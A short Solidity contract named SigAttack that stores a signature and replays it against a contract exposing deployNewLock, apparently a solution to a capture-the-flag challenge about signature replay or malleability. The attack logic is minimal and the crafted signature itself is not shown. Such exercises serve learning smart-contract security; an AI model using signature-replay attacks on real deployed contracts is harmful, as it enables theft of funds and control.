pragma solidity ^0.8.0;

interface Impersonator {
 function deployNewLock(bytes memory signature) external;
}


contract SigAttack {

    bytes public signature;

 constructor(bytes memory _signature) {
 signature = _signature;
 }

 function attack(address impersonator) external {
 Impersonator(impersonator).deployNewLock(signature);
 }
}